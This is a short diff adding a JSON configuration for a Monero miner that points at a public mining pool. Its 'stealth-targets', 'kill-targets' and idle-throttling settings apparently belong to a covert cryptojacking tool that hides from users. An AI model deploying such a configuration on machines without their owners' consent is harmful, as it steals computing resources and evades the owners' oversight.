@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "xmr.2miners.com",
+    "port": 2222,
+    "wallet": "",
+    "password": "",
+    "nicehash": false,
+    "ssltls": false,
+    "max-cpu": 20,
+    "idle-wait": 0,
+    "idle-cpu": 80,
+    "stealth-targets": "",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
